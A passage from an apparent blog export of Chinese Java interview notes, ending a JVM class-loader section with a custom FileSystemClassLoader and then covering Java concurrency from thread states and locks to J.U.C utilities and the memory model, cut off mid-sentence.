ClassNotFoundException thrown if class not found // from the non-null parent class loader &#125; if (c == null) &#123; // If still not found, then invoke findClass in order // to find the class. c = findClass(name); &#125; &#125; if (resolve) &#123; resolveClass(c); &#125; return c; &#125; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; throw new ClassNotFoundException(name); &#125;&#125; 4. 自定义类加载器实现FileSystemClassLoader 是自定义类加载器，继承自 java.lang.ClassLoader，用于加载文件系统上的类。它首先根据类的全名在文件系统上查找类的字节代码文件（.class 文件），然后读取该文件内容，最后通过 defineClass() 方法来把这些字节代码转换成 java.lang.Class 类的实例。 java.lang.ClassLoader 的 loadClass() 实现了双亲委派模型的逻辑，因此自定义类加载器一般不去重写它，但是需要重写 findClass() 方法。 12345678910111213141516171819202122232425262728293031323334353637383940public class FileSystemClassLoader extends ClassLoader &#123; private String rootDir; public FileSystemClassLoader(String rootDir) &#123; this.rootDir = rootDir; &#125; protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; byte[] classData = getClassData(name); if (classData == null) &#123; throw new ClassNotFoundException(); &#125; else &#123; return defineClass(name, classData, 0, classData.length); &#125; &#125; private byte[] getClassData(String className) &#123; String path = classNameToPath(className); try &#123; InputStream ins = new FileInputStream(path); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 4096; byte[] buffer = new byte[bufferSize]; int bytesNumRead; while ((bytesNumRead = ins.read(buffer)) != -1) &#123; baos.write(buffer, 0, bytesNumRead); &#125; return baos.toByteArray(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return null; &#125; private String classNameToPath(String className) &#123; return rootDir + File.separatorChar + className.replace('.', File.separatorChar) + ".class"; &#125;&#125; 参考资料 周志明. 深入理解 Java 虚拟机 [M]. 机械工业出版社, 2011. Jvm memory Memory Architecture Of JVM(Runtime Data Areas) JVM Run-Time Data Areas Android on x86: Java Native Interface and the Android Native Development Kit 深入理解 JVM(2)——GC 算法与内存分配策略 深入理解 JVM(3)——7 种垃圾收集器 JVM Internals 深入探讨 Java 类加载器 Guide to WeakHashMap in Java Tomcat example source code file (ConcurrentCache.java)]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java 并发]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FJava%20%E5%B9%B6%E5%8F%91%2F</url>
    <content type="text"><![CDATA[一、线程状态转换 新建（New） 可运行（Runnable） 阻塞（Blocking） 无限期等待（Waiting） 限期等待（Timed Waiting） 死亡（Terminated） 二、使用线程 实现 Runnable 接口 实现 Callable 接口 继承 Thread 类 实现接口 VS 继承 Thread 三、基础线程机制 Executor Daemon sleep() yield() 四、中断 InterruptedException interrupted() Executor 的中断操作 五、互斥同步 synchronized ReentrantLock synchronized 和 ReentrantLock 比较 六、线程之间的协作 join() wait() notify() notifyAll() await() signal() signalAll() 七、J.U.C - AQS CountdownLatch CyclicBarrier Semaphore 八、J.U.C - 其它组件 FutureTask BlockingQueue ForkJoin 九、线程不安全示例 十、Java 内存模型 主内存与工作内存 内存间交互操作 内存模型三大特性 先行发生原则 十一、线程安全 线程安全定义 线程安全分类 线程安全的实现方法 十二、锁优化 自旋锁 锁消除 锁粗化 轻量级锁 偏向锁 十三、多线程开发良好的实践 参考资料 一、线程状态转换 新建（New）创建后尚未启动。 可运行（Runnable）可能正在运行，也可能正在等待 CPU 时间片。 包含了操作系统线程状态中的 Running 和 Ready。 阻塞（Blocking）等待获取一个排它锁，如果其线程释放了锁就会结束此状态。 无限期等待（Waiting）等待其它线程显式地唤醒，否则不会被分配 CPU 时间片。 进入方法 退出方法 没有设置 Timeout 参数的 Object.wait() 方法 Object.notify() / Object.notifyAll() 没有设置 Timeout 参数的 Thread.join() 方法 被调用的线程执行完毕 LockSupport.park() 方法 - 限期等待（Timed Waiting）无需等待其它线程显式地唤醒，在一定时间之后会被系统自动唤醒。 调用 Thread.sleep() 方法使线程进入限期等待状态时，常常用“使一个线程睡眠”进行描述。 调用 Object.wait() 方法使线程进入限期等待或者无限期等待时，常常用“挂起一个线程”进行描述。 睡眠和挂起是用来描述行为，而阻塞和等待用来描述状态。 阻塞和等待的区别在于，阻塞是被动的，它是在等待获取一个排它锁。而等待是主动的，通过调用 Thread.sleep() 和 Object.wait() 等方法进入。 进入方法 退出方法 Thread.sleep() 方法 时间结束 设置了 Timeout 参数的 Object.wait() 方法 时间结束 / Object.notify() / Object.notifyAll() 设置了 Timeout 参数的 Thread.join() 方法 时间结束 / 被调用的线程执行完毕 LockSupport.parkNanos() 方法 - LockSupport.parkUntil() 方法 - 死亡（Terminated）可以是线程结束任务之后自己结束，或者产生了异常而结束。 二、使用线程有三种使用线程的方法： 实现 Runnable 接口； 实现 Callable 接口； 继承 Thread 类。 实现 Runnable 和 Callable 接口的类只能当做一个可以在线程中运行的任务，不是真正意义上的线程，因此最后还需要通过 Thread 来调用。可以说任务是通过线程驱动从而执行的。 实现 Runnable 接口需要实现 run() 方法。 通过 Thread 调用 start() 方法来启动线程。 12345public class MyRunnable implements Runnable &#123; public void run() &#123; // ... &#125;&#125; 12345public static void main(String[] args) &#123; MyRunnable instance = new MyRunnable(); Thread thread = new Thread(instance); thread.start();&#125; 实现 Callable 接口与 Runnable 相比，Callable 可以有返回值，返回值通过 FutureTask 进行封装。 12345public class MyCallable implements Callable&lt;Integer&gt; &#123; public Integer call() &#123; return 123; &#125;&#125; 1234567public static void main(String[] args) throws ExecutionException, InterruptedException &#123; MyCallable mc = new MyCallable(); FutureTask&lt;Integer&gt; ft = new FutureTask&lt;&gt;(mc); Thread thread = new Thread(ft); thread.start(); System.out.println(ft.get());&#125; 继承 Thread 类同样也是需要实现 run() 方法，因为 Thread 类也实现了 Runable 接口。 12345public class MyThread extends Thread &#123; public void run() &#123; // ... &#125;&#125; 1234public static void main(String[] args) &#123; MyThread mt = new MyThread(); mt.start();&#125; 实现接口 VS 继承 Thread实现接口会更好一些，因为： Java 不支持多重继承，因此继承了 Thread 类就无法继承其它类，但是可以实现多个接口； 类可能只要求可执行就行，继承整个 Thread 类开销过大。 三、基础线程机制ExecutorExecutor 管理多个异步任务的执行，而无需程序员显式地管理线程的生命周期。这里的异步是指多个任务的执行互不干扰，不需要进行同步操作。 主要有三种 Executor： CachedThreadPool：一个任务创建一个线程； FixedThreadPool：所有任务只能使用固定大小的线程； SingleThreadExecutor：相当于大小为 1 的 FixedThreadPool。 1234567public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; 5; i++) &#123; executorService.execute(new MyRunnable()); &#125; executorService.shutdown();&#125; Daemon守护线程是程序运行时在后台提供服务的线程，不属于程序中不可或缺的部分。 当所有非守护线程结束时，程序也就终止，同时会杀死所有守护线程。 main() 属于非守护线程。 使用 setDaemon() 方法将一个线程设置为守护线程。 1234public static void main(String[] args) &#123; Thread thread = new Thread(new MyRunnable()); thread.setDaemon(true);&#125; sleep()Thread.sleep(millisec) 方法会休眠当前正在执行的线程，millisec 单位为毫秒。 sleep() 可能会抛出 InterruptedException，因为异常不能跨线程传播回 main() 中，因此必须在本地进行处理。线程中抛出的其它异常也同样需要在本地进行处理。 1234567public void run() &#123; try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125;&#125; yield()对静态方法 Thread.yield() 的调用声明了当前线程已经完成了生命周期中最重要的部分，可以切换给其它线程来执行。该方法只是对线程调度器的一个建议，而且也只是建议具有相同优先级的其它线程可以运行。 123public void run() &#123; Thread.yield();&#125; 四、中断一个线程执行完毕之后会自动结束，如果在运行过程中发生异常也会提前结束。 InterruptedException通过调用一个线程的 interrupt() 来中断该线程，如果该线程处于阻塞、限期等待或者无限期等待状态，那么就会抛出 InterruptedException，从而提前结束该线程。但是不能中断 I/O 阻塞和 synchronized 锁阻塞。 对于以下代码，在 main() 中启动一个线程之后再中断它，由于线程中调用了 Thread.sleep() 方法，因此会抛出一个 InterruptedException，从而提前结束线程，不执行之后的语句。 1234567891011121314public class InterruptExample &#123; private static class MyThread1 extends Thread &#123; @Override public void run() &#123; try &#123; Thread.sleep(2000); System.out.println("Thread run"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 123456public static void main(String[] args) throws InterruptedException &#123; Thread thread1 = new MyThread1(); thread1.start(); thread1.interrupt(); System.out.println("Main run");&#125; 123456Main runjava.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at InterruptExample.lambda$main$0(InterruptExample.java:5) at InterruptExample$$Lambda$1/713338599.run(Unknown Source) at java.lang.Thread.run(Thread.java:745) interrupted()如果一个线程的 run() 方法执行一个无限循环，并且没有执行 sleep() 等会抛出 InterruptedException 的操作，那么调用线程的 interrupt() 方法就无法使线程提前结束。 但是调用 interrupt() 方法会设置线程的中断标记，此时调用 interrupted() 方法会返回 true。因此可以在循环体中使用 interrupted() 方法来判断线程是否处于中断状态，从而提前结束线程。 123456789101112public class InterruptExample &#123; private static class MyThread2 extends Thread &#123; @Override public void run() &#123; while (!interrupted()) &#123; // .. &#125; System.out.println("Thread end"); &#125; &#125;&#125; 12345public static void main(String[] args) throws InterruptedException &#123; Thread thread2 = new MyThread2(); thread2.start(); thread2.interrupt();&#125; 1Thread end Executor 的中断操作调用 Executor 的 shutdown() 方法会等待线程都执行完毕之后再关闭，但是如果调用的是 shutdownNow() 方法，则相当于调用每个线程的 interrupt() 方法。 以下使用 Lambda 创建线程，相当于创建了一个匿名内部线程。 12345678910111213public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; &#123; try &#123; Thread.sleep(2000); System.out.println("Thread run"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;); executorService.shutdownNow(); System.out.println("Main run");&#125; 12345678Main runjava.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at ExecutorInterruptExample.lambda$main$0(ExecutorInterruptExample.java:9) at ExecutorInterruptExample$$Lambda$1/1160460865.run(Unknown Source) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) 如果只想中断 Executor 中的一个线程，可以通过使用 submit() 方法来提交一个线程，它会返回一个 Future&lt;?&gt; 对象，通过调用该对象的 cancel(true) 方法就可以中断线程。 1234Future&lt;?&gt; future = executorService.submit(() -&gt; &#123; // ..&#125;);future.cancel(true); 五、互斥同步Java 提供了两种锁机制来控制多个线程对共享资源的互斥访问，第一个是 JVM 实现的 synchronized，而另一个是 JDK 实现的 ReentrantLock。 synchronized1. 同步一个代码块 12345public void func() &#123; synchronized (this) &#123; // ... &#125;&#125; 它只作用于同一个对象，如果调用两个对象上的同步代码块，就不会进行同步。 对于以下代码，使用 ExecutorService 执行了两个线程，由于调用的是同一个对象的同步代码块，因此这两个线程会进行同步，当一个线程进入同步语句块时，另一个线程就必须等待。 12345678910public class SynchronizedExample &#123; public void func1() &#123; synchronized (this) &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + " "); &#125; &#125; &#125;&#125; 123456public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func1()); executorService.execute(() -&gt; e1.func1());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 对于以下代码，两个线程调用了不同对象的同步代码块，因此这两个线程就不需要同步。从输出结果可以看出，两个线程交叉执行。 1234567public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func1()); executorService.execute(() -&gt; e2.func1());&#125; 10 0 1 1 2 2 3 3 4 4 5 5 6 6 7 7 8 8 9 9 2. 同步一个方法 123public synchronized void func () &#123; // ...&#125; 它和同步代码块一样，作用于同一个对象。 3. 同步一个类 12345public void func() &#123; synchronized (SynchronizedExample.class) &#123; // ... &#125;&#125; 作用于整个类，也就是说两个线程调用同一个类的不同对象上的这种同步语句，也会进行同步。 12345678910public class SynchronizedExample &#123; public void func2() &#123; synchronized (SynchronizedExample.class) &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + " "); &#125; &#125; &#125;&#125; 1234567public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func2()); executorService.execute(() -&gt; e2.func2());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 4. 同步一个静态方法 123public synchronized static void fun() &#123; // ...&#125; 作用于整个类。 ReentrantLock123456789101112131415public class LockExample &#123; private Lock lock = new ReentrantLock(); public void func() &#123; lock.lock(); try &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + " "); &#125; &#125; finally &#123; lock.unlock(); // 确保释放锁，从而避免发生死锁。 &#125; &#125;&#125; 123456public static void main(String[] args) &#123; LockExample lockExample = new LockExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; lockExample.func()); executorService.execute(() -&gt; lockExample.func());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 ReentrantLock 是 java.util.concurrent（J.U.C）包中的锁，相比于 synchronized，它多了以下高级功能： 1. 等待可中断 当持有锁的线程长期不释放锁的时候，正在等待的线程可以选择放弃等待，改为处理其他事情。 2. 可实现公平锁 公平锁是指多个线程在等待同一个锁时，必须按照申请锁的时间顺序来依次获得锁。 synchronized 中的锁是非公平的，ReentrantLock 默认情况下也是非公平的，但可以通过带布尔值的构造函数要求使用公平锁。 3. 锁绑定多个条件 一个 ReentrantLock 对象可以同时绑定多个 Condition 对象。 synchronized 和 ReentrantLock 比较1. 锁的实现 synchronized 是 JVM 实现的，而 ReentrantLock 是 JDK 实现的。 2. 性能 新版本 Java 对 synchronized 进行了很多优化，例如自旋锁等。目前来看它和 ReentrantLock 的性能基本持平了，因此性能因素不再是选择 ReentrantLock 的理由。synchronized 有更大的性能优化空间，应该优先考虑 synchronized。 3. 功能 ReentrantLock 多了一些高级功能。 4. 使用选择 除非需要使用 ReentrantLock 的高级功能，否则优先使用 synchronized。这是因为 synchronized 是 JVM 实现的一种锁机制，JVM 原生地支持它，而 ReentrantLock 不是所有的 JDK 版本都支持。并且使用 synchronized 不用担心没有释放锁而导致死锁问题，因为 JVM 会确保锁的释放。 六、线程之间的协作当多个线程可以一起工作去解决某个问题时，如果某些部分必须在其它部分之前完成，那么就需要对线程进行协调。 join()在线程中调用另一个线程的 join() 方法，会将当前线程挂起，而不是忙等待，直到目标线程结束。 对于以下代码，虽然 b 线程先启动，但是因为在 b 线程中调用了 a 线程的 join() 方法，b 线程会等待 a 线程结束才继续执行，因此最后能够保证 a 线程的输出先于 b 线程的输出。 1234567891011121314151617181920212223242526272829303132333435public class JoinExample &#123; private class A extends Thread &#123; @Override public void run() &#123; System.out.println("A"); &#125; &#125; private class B extends Thread &#123; private A a; B(A a) &#123; this.a = a; &#125; @Override public void run() &#123; try &#123; a.join(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println("B"); &#125; &#125; public void test() &#123; A a = new A(); B b = new B(a); b.start(); a.start(); &#125;&#125; 1234public static void main(String[] args) &#123; JoinExample example = new JoinExample(); example.test();&#125; 12AB wait() notify() notifyAll()调用 wait() 使得线程等待某个条件满足，线程在等待时会被挂起，当其他线程的运行使得这个条件满足时，其它线程会调用 notify() 或者 notifyAll() 来唤醒挂起的线程。 它们都属于 Object 的一部分，而不属于 Thread。 只能用在同步方法或者同步控制块中使用，否则会在运行时抛出 IllegalMonitorStateExeception。 使用 wait() 挂起期间，线程会释放锁。这是因为，如果没有释放锁，那么其它线程就无法进入对象的同步方法或者同步控制块中，那么就无法执行 notify() 或者 notifyAll() 来唤醒挂起的线程，造成死锁。 123456789101112131415public class WaitNotifyExample &#123; public synchronized void before() &#123; System.out.println("before"); notifyAll(); &#125; public synchronized void after() &#123; try &#123; wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println("after"); &#125;&#125; 123456public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); WaitNotifyExample example = new WaitNotifyExample(); executorService.execute(() -&gt; example.after()); executorService.execute(() -&gt; example.before());&#125; 12beforeafter wait() 和 sleep() 的区别 wait() 是 Object 的方法，而 sleep() 是 Thread 的静态方法； wait() 会释放锁，sleep() 不会。 await() signal() signalAll()java.util.concurrent 类库中提供了 Condition 类来实现线程之间的协调，可以在 Condition 上调用 await() 方法使线程等待，其它线程调用 signal() 或 signalAll() 方法唤醒等待的线程。相比于 wait() 这种等待方式，await() 可以指定等待的条件，因此更加灵活。 使用 Lock 来获取一个 Condition 对象。 1234567891011121314151617181920212223242526public class AwaitSignalExample &#123; private Lock lock = new ReentrantLock(); private Condition condition = lock.newCondition(); public void before() &#123; lock.lock(); try &#123; System.out.println("before"); condition.signalAll(); &#125; finally &#123; lock.unlock(); &#125; &#125; public void after() &#123; lock.lock(); try &#123; condition.await(); System.out.println("after"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; lock.unlock(); &#125; &#125;&#125; 123456public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); AwaitSignalExample example = new AwaitSignalExample(); executorService.execute(() -&gt; example.after()); executorService.execute(() -&gt; example.before());&#125; 12beforeafter 七、J.U.C - AQSjava.util.concurrent（J.U.C）大大提高了并发性能，AQS 被认为是 J.U.C 的核心。 CountdownLatch用来控制一个线程等待多个线程。 维护了一个计数器 cnt，每次调用 countDown() 方法会让计数器的值减 1，减到 0 的时候，那些因为调用 await() 方法而在等待的线程就会被唤醒。 1234567891011121314151617public class CountdownLatchExample &#123; public static void main(String[] args) throws InterruptedException &#123; final int totalThread = 10; CountDownLatch countDownLatch = new CountDownLatch(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalThread; i++) &#123; executorService.execute(() -&gt; &#123; System.out.print("run.."); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); System.out.println("end"); executorService.shutdown(); &#125;&#125; 1run..run..run..run..run..run..run..run..run..run..end CyclicBarrier用来控制多个线程互相等待，只有当多个线程都到达时，这些线程才会继续执行。 和 CountdownLatch 相似，都是通过维护计数器来实现的。但是它的计数器是递增的，每次执行 await() 方法之后，计数器会加 1，直到计数器的值和设置的值相等，等待的所有线程才会继续执行。和 CountdownLatch 的另一个区别是，CyclicBarrier 的计数器可以循环使用，所以它才叫做循环屏障。 下图应该从下往上看才正确。 123456789101112131415161718192021public class CyclicBarrierExample &#123; public static void main(String[] args) throws InterruptedException &#123; final int totalThread = 10; CyclicBarrier cyclicBarrier = new CyclicBarrier(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalThread; i++) &#123; executorService.execute(() -&gt; &#123; System.out.print("before.."); try &#123; cyclicBarrier.await(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; catch (BrokenBarrierException e) &#123; e.printStackTrace(); &#125; System.out.print("after.."); &#125;); &#125; executorService.shutdown(); &#125;&#125; 1before..before..before..before..before..before..before..before..before..before..after..after..after..after..after..after..after..after..after..after.. SemaphoreSemaphore 就是操作系统中的信号量，可以控制对互斥资源的访问线程数。 以下代码模拟了对某个服务的并发请求，每次只能有 3 个客户端同时访问，请求总数为 10。 123456789101112131415161718192021public class SemaphoreExample &#123; public static void main(String[] args) &#123; final int clientCount = 3; final int totalRequestCount = 10; Semaphore semaphore = new Semaphore(clientCount); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalRequestCount; i++) &#123; executorService.execute(()-&gt;&#123; try &#123; semaphore.acquire(); System.out.print(semaphore.availablePermits() + " "); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; semaphore.release(); &#125; &#125;); &#125; executorService.shutdown(); &#125;&#125; 12 1 2 2 2 2 2 1 2 2 八、J.U.C - 其它组件FutureTask在介绍 Callable 时我们知道它可以有返回值，返回值通过 Future 进行封装。FutureTask 实现了 RunnableFuture 接口，该接口继承自 Runnable 和 Future 接口，这使得 FutureTask 既可以当做一个任务执行，也可以有返回值。 1public class FutureTask&lt;V&gt; implements RunnableFuture&lt;V&gt; 1public interface RunnableFuture&lt;V&gt; extends Runnable, Future&lt;V&gt; FutureTask 可用于异步获取执行结果或取消执行任务的场景。当一个计算任务需要执行很长时间，那么就可以用 FutureTask 来封装这个任务，主线程在完成自己的任务之后再去获取结果。 1234567891011121314151617181920212223242526272829public class FutureTaskExample &#123; public static void main(String[] args) throws ExecutionException, InterruptedException &#123; FutureTask&lt;Integer&gt; futureTask = new FutureTask&lt;Integer&gt;(new Callable&lt;Integer&gt;() &#123; @Override public Integer call() throws Exception &#123; int result = 0; for (int i = 0; i &lt; 100; i++) &#123; Thread.sleep(10); result += i; &#125; return result; &#125; &#125;); Thread computeThread = new Thread(futureTask); computeThread.start(); Thread otherThread = new Thread(() -&gt; &#123; System.out.println("other task is running..."); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;); otherThread.start(); System.out.println(futureTask.get()); &#125;&#125; 12other task is running...4950 BlockingQueuejava.util.concurrent.BlockingQueue 接口有以下阻塞队列的实现： FIFO 队列 ：LinkedBlockingQueue、ArrayBlockingQueue（固定长度） 优先级队列 ：PriorityBlockingQueue 提供了阻塞的 take() 和 put() 方法：如果队列为空 take() 将阻塞，直到队列中有内容；如果队列为满 put() 将阻塞，直到队列有空闲位置。 使用 BlockingQueue 实现生产者消费者问题 1234567891011121314151617181920212223242526272829public class ProducerConsumer &#123; private static BlockingQueue&lt;String&gt; queue = new ArrayBlockingQueue&lt;&gt;(5); private static class Producer extends Thread &#123; @Override public void run() &#123; try &#123; queue.put("product"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.print("produce.."); &#125; &#125; private static class Consumer extends Thread &#123; @Override public void run() &#123; try &#123; String product = queue.take(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.print("consume.."); &#125; &#125;&#125; 1234567891011121314public static void main(String[] args) &#123; for (int i = 0; i &lt; 2; i++) &#123; Producer producer = new Producer(); producer.start(); &#125; for (int i = 0; i &lt; 5; i++) &#123; Consumer consumer = new Consumer(); consumer.start(); &#125; for (int i = 0; i &lt; 3; i++) &#123; Producer producer = new Producer(); producer.start(); &#125;&#125; 1produce..produce..consume..consume..produce..consume..produce..consume..produce..consume.. ForkJoin主要用于并行计算中，和 MapReduce 原理类似，都是把大的计算任务拆分成多个小任务并行计算。 123456789101112131415161718192021222324252627282930public class ForkJoinExample extends RecursiveTask&lt;Integer&gt; &#123; private final int threhold = 5; private int first; private int last; public ForkJoinExample(int first, int last) &#123; this.first = first; this.last = last; &#125; @Override protected Integer compute() &#123; int result = 0; if (last - first &lt;= threhold) &#123; // 任务足够小则直接计算 for (int i = first; i &lt;= last; i++) &#123; result += i; &#125; &#125; else &#123; // 拆分成小任务 int middle = first + (last - first) / 2; ForkJoinExample leftTask = new ForkJoinExample(first, middle); ForkJoinExample rightTask = new ForkJoinExample(middle + 1, last); leftTask.fork(); rightTask.fork(); result = leftTask.join() + rightTask.join(); &#125; return result; &#125;&#125; 123456public static void main(String[] args) throws ExecutionException, InterruptedException &#123; ForkJoinExample example = new ForkJoinExample(1, 10000); ForkJoinPool forkJoinPool = new ForkJoinPool(); Future result = forkJoinPool.submit(example); System.out.println(result.get());&#125; ForkJoin 使用 ForkJoinPool 来启动，它是一个特殊的线程池，线程数量取决于 CPU 核数。 1public class ForkJoinPool extends AbstractExecutorService ForkJoinPool 实现了工作窃取算法来提高 CPU 的利用率。每个线程都维护了一个双端队列，用来存储需要执行的任务。工作窃取算法允许空闲的线程从其它线程的双端队列中窃取一个任务来执行。窃取的任务必须是最晚的任务，避免和队列所属线程发生竞争。例如下图中，Thread2 从 Thread1 的队列中拿出最晚的 Task1 任务，Thread1 会拿出 Task2 来执行，这样就避免发生竞争。但是如果队列中只有一个任务时还是会发生竞争。 九、线程不安全示例如果多个线程对同一个共享数据进行访问而不采取同步操作的话，那么操作的结果是不一致的。 以下代码演示了 1000 个线程同时对 cnt 执行自增操作，操作结束之后它的值为 997 而不是 1000。 123456789101112public class ThreadUnsafeExample &#123; private int cnt = 0; public void add() &#123; cnt++; &#125; public int get() &#123; return cnt; &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; ThreadUnsafeExample example = new ThreadUnsafeExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 1997 十、Java 内存模型Java 内存模型试图屏蔽各种硬件和操作系统的内存访问差异，以实现让 Java 程序在各种平台下都能达到一致的内存访问效果。 主内存与工作内存处理器上的寄存器的读写的速度比内存快几个数量级，为了解决这种速度矛盾，在它们之间加入了高速缓存。 加入高速缓存带来了一个新的问题：缓存一致性。如果多个缓存共享同一块主内存区域，那么多个缓存的数据可能会不一致，需要一些协议来解决这个问题。 所有的变量都存储在主内存中，每个线程还有自己的工作内存，工作内存存储在高速缓存或者寄存器中，保存了该线程使用的变量的主内存副本拷贝。 线程只能直接操作工作内存中的变量，不同线程之间的变量值传递需要通过主内存来完成。 内存间交互操作Java 内存模型定义了 8 个操作来完成主内存和工作内存的交互操作。 read：把一个变量的值从主内存传输到工作内存中 load：在 read 之后执行，把 read 得到的值放入工作内存的变量副本中 use：把工作内存中一个变量的值传递给执行引擎 assign：把一个从执行引擎接收到的值赋给工作内存的变量 store：把工作内存的一个变量的值传送到主内存中 write：在 store 之后执行，把 store 得到的值放入主内存的变量中 lock：作用于主内存的变量 unlock 内存模型三大特性1. 原子性Java 内存模型保证了 read、load、use、assign、store、write、lock 和 unlock 操作具有原子性，例如对一个 int 类型的变量执行 assign 赋值操作，这个操作就是原子性的。但是 Java 内存模型允许虚拟机将没有被 volatile 修饰的 64 位数据（long，double）的读写操作划分为两次 32 位的操作来进行，即 load、store、read 和 write 操作可以不具备原子性。 有一个错误认识就是，int 等原子性的变量在多线程环境中不会出现线程安全问题。前面的线程不安全示例代码中，cnt 变量属于 int 类型变量，1000 个线程对它进行自增操作之后，得到的值为 997 而不是 1000。 为了方便讨论，将内存间的交互操作简化为 3 个：load、assign、store。 下图演示了两个线程同时对 cnt 变量进行操作，load、assign、store 这一系列操作整体上看不具备原子性，那么在 T1 修改 cnt 并且还没有将修改后的值写入主内存，T2 依然可以读入该变量的值。可以看出，这两个线程虽然执行了两次自增运算，但是主内存中 cnt 的值最后为 1 而不是 2。因此对 int 类型读写操作满足原子性只是说明 load、assign、store 这些单个操作具备原子性。 AtomicInteger 能保证多个线程修改的原子性。 使用 AtomicInteger 重写之前线程不安全的代码之后得到以下线程安全实现： 1234567891011public class AtomicExample &#123; private AtomicInteger cnt = new AtomicInteger(); public void add() &#123; cnt.incrementAndGet(); &#125; public int get() &#123; return cnt.get(); &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; AtomicExample example = new AtomicExample(); // 只修改这条语句 final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 11000 除了使用原子类之外，也可以使用 synchronized 互斥锁来保证操作的完整性，它对应的内存间交互操作为：lock 和 unlock，在虚拟机实现上对应的字节码指令为 monitorenter 和 monitorexit。 1234567891011public class AtomicSynchronizedExample &#123; private int cnt = 0; public synchronized void add() &#123; cnt++; &#125; public synchronized int get() &#123; return cnt; &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; AtomicSynchronizedExample example = new AtomicSynchronizedExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 11000 2. 可见性可见性指当一个线程修改了共享变量的值，其它线程能够立即得知这个修改。Java 内存模型是通过在变量修改后将新值同步回主内存，在变量读取前从主内存刷新变量值来实现可见性的。 volatile 可保证可见性。synchronized 也能够保证可见性，对一个变量执行 unlock 操作之前，必须把变量值同步回主内存。final 关键字也能保证可见性：被 final 关键字修饰的字段在构造器中一旦初始化完成，并且没有发生 this 逃逸（其它线程可以通过 this 引用访问到初始化了一半的对象），那么其它线程就能看见 final 字段的值。 对前面的线程不安全示例中的 cnt 变量用 volatile 修饰，不能解决线程不安全问题，因为 volatile 并不能保证操作的原子性。 3. 有序性有序性是指：在本线程内观察，所有操作都是有序的。在一个线程观察另一个线程，所有操作都是无序的，无序是因为发生了指令重排序。 在 Java 